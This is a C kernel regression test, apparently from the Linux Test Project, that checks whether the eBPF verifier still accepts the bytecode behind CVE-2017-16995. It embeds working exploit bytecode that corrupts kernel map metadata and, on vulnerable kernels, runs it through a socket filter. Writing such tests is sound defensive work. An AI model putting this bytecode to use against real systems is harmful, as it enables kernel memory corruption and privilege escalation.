// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2019 Richard Palethorpe <rpalethorpe@suse.com>
 * Original byte code was provided by jannh@google.com
 *
 * Check for the bug fixed by 95a762e2c8c942780948091f8f2a4f32fce1ac6f
 * "bpf: fix incorrect sign extension in check_alu_op()"
 * CVE-2017-16995
 *
 * This test is very similar to the reproducer found here:
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1454
 *
 * However it has been modified to try to corrupt the map struct instead of
 * writing to a noncanonical pointer. This appears to be more reliable at
 * producing stack traces and confirms we would be able to overwrite the ops
 * function pointers, as suggested by Jan.
 *
 * If the eBPF code is loaded then this is considered a failure regardless of
 * whether it is able to cause any visible damage.
 */

#include <string.h>
#include <stdio.h>
#include <inttypes.h>

#include "config.h"
#include "tst_test.h"
#include "tst_capability.h"
#include "lapi/socket.h"
#include "lapi/bpf.h"
#include "bpf_common.h"

#define LOG_SIZE (1024 * 1024)

static const char MSG[] = "Ahoj!";
static char *msg;

static char *log;
static uint32_t *key;
static uint64_t *val;
static union bpf_attr *attr;

static int load_prog(int fd)
{
	static struct bpf_insn *prog;
	struct bpf_insn insn[] = {
		BPF_LD_MAP_FD(BPF_REG_1, fd),

		// fill r0 with pointer to map value
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -4), // allocate 4 bytes stack
		BPF_MOV32_IMM(BPF_REG_2, 0),
		BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_2, 0),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
		BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
		BPF_EXIT_INSN(), // exit

		// r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
		BPF_MOV32_IMM(BPF_REG_1, -1),
		// r1 = 0x1'0000'0000, mistreated as 0
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
		// r1 = 64, mistreated as 0
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 26),

		// Write actual value of r1 to map for debugging this test
		BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),

		// Corrupt the map meta-data which comes before the map data
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),

		BPF_MOV64_IMM(BPF_REG_3, 0xdeadbeef),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),

		// terminate to make the verifier happy
		BPF_MOV32_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN()
	};

	if (!prog)
		prog = tst_alloc(sizeof(insn));
	memcpy(prog, insn, sizeof(insn));

	memset(attr, 0, sizeof(*attr));
	attr->prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
	attr->insns = ptr_to_u64(prog);
	attr->insn_cnt = ARRAY_SIZE(insn);
	attr->license = ptr_to_u64("GPL");
	attr->log_buf = ptr_to_u64(log);
	attr->log_size = LOG_SIZE;
	attr->log_level = 1;

	TEST(bpf(BPF_PROG_LOAD, attr, sizeof(*attr)));
	if (TST_RET == -1) {
		if (log[0] != 0)
			tst_res(TPASS | TTERRNO, "Failed verification");
		else
			tst_brk(TBROK | TTERRNO, "Failed to load program");
	} else {
		tst_res(TINFO, "Verification log:");
		fputs(log, stderr);
	}

	return TST_RET;
}

static void setup(void)
{
	rlimit_bump_memlock();
	memcpy(msg, MSG, sizeof(MSG));
}

static void run(void)
{
	int map_fd, prog_fd;
	int sk[2];

	memset(attr, 0, sizeof(*attr));
	attr->map_type = BPF_MAP_TYPE_ARRAY;
	attr->key_size = 4;
	attr->value_size = 8;
	attr->max_entries = 32;

	map_fd = bpf_map_create(attr);

	memset(attr, 0, sizeof(*attr));
	attr->map_fd = map_fd;
	attr->key = ptr_to_u64(key);
	attr->value = ptr_to_u64(val);
	attr->flags = BPF_ANY;

	TEST(bpf(BPF_MAP_UPDATE_ELEM, attr, sizeof(*attr)));
	if (TST_RET == -1)
		tst_brk(TBROK | TTERRNO, "Failed to lookup map element");

	prog_fd = load_prog(map_fd);
	if (prog_fd == -1)
		goto exit;

	tst_res(TFAIL, "Loaded bad eBPF, now we will run it and maybe crash");

	SAFE_SOCKETPAIR(AF_UNIX, SOCK_DGRAM, 0, sk);
	SAFE_SETSOCKOPT(sk[1], SOL_SOCKET, SO_ATTACH_BPF,
			&prog_fd, sizeof(prog_fd));

	SAFE_WRITE(1, sk[0], msg, sizeof(MSG));

	memset(attr, 0, sizeof(*attr));
	attr->map_fd = map_fd;
	attr->key = ptr_to_u64(key);
	attr->value = ptr_to_u64(val);
	*key = 0;

	TEST(bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)));
	if (TST_RET == -1)
		tst_res(TFAIL | TTERRNO, "array map lookup");
	else
		tst_res(TINFO, "Pointer offset was 0x%"PRIx64, *val);

	SAFE_CLOSE(sk[0]);
	SAFE_CLOSE(sk[1]);
	SAFE_CLOSE(prog_fd);
exit:
	SAFE_CLOSE(map_fd);
}

static struct tst_test test = {
	.setup = setup,
	.test_all = run,
	.min_kver = "3.18",
	.caps = (struct tst_cap []) {
		TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
		{}
	},
	.bufs = (struct tst_buffers []) {
		{&key, .size = sizeof(*key)},
		{&val, .size = sizeof(*val)},
		{&log, .size = LOG_SIZE},
		{&attr, .size = sizeof(*attr)},
		{&msg, .size = sizeof(MSG)},
		{},
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "95a762e2c8c9"},
		{"CVE", "2017-16995"},
		{}
	}
};
